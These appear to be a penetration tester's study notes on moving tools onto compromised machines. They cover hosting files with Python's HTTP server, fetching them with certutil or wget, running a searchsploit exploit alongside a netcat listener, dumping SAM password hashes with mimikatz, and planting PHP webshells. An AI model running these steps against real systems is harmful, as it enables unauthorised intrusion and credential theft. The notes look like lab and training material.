After obtaining initial access to a target system, you will need to transfer files to the target system.

In some cases, you will not have access to the target system via a meterpreter session and as a result you will need to  use the inbuilt OS specific utilities to facilitate the transfer of files from your system to the target system.

This process utilizes a two step approach where you will need to host the files you want to transfer on a web server and download the files hosted on the web server to the target system.

Python has a built-in module known as SimpleHTTPServer (python2) and http.server (python3) that can be used to facilitate a simple HTTP server that gives you standard GET and HEAD request handlers.

This module can be used to host files in any directory of your system and can be implemented through your terminal.

pythom -m SimpleHTTPServer <port you want to host on> (python 2 method)
python3 -m http.server <port you want to host on> (python 3 method)

----------Transferring files to Windows targets-----------------
If you find an exploitable service through searchsplot <search program / version>

searchsploit -m <exploit ID> (will copy python exploit to your current working directory)

**to use this exploit you need to vim or nano it and change the options just like we do in metasploit**
:wq to save and quit vim

nc -nvlp <port to listen on>
cd/usr/share/windows-binaries (sometimes a searchsploit exploit requires certain variables like running with netcat.exe in the webserver directory, make sure you ready the exploit usage requirements when you vim the .py script)
python3 -m http.server 80
python 39161.py <ip and port>

**WHENEVER YOU TRANSFER FILES TO A TARGET SYSTEM DO IT IN THE TEMP DIRECTORY** **may have to cd C:\\ and mkdir Temp

cd/usr/share/windows-resources/mimikatz/x64/ (mimikatz is a post exploit tool used to dump hashes, if you have a simple target session you can use this)
**host the python server in the directory the mimikatz/x64/ file is found**
**on windows machines the certutil -urlcache -f http://<yourip>/mimikatz.exe mimikatz.exe**

dir (shows directory confirm file downloaded)
mimikatz.exe
privilege::debug
lsadump::sam
exit (backs out of application)
type <filename.txt> (will cat on a windows machine with the windows shell)


----------Transferring files to Linux targets-----------------
**Transfer files to temp directory**
cd /usr/share/webshells//php **example of transfer**
python3 -m http.server <port> (will host all files in the directory you run this command in)
**now on the linux target to download a file in the temp directory**
wget http://<yourip>/<filename>
ls (confirm file is there)

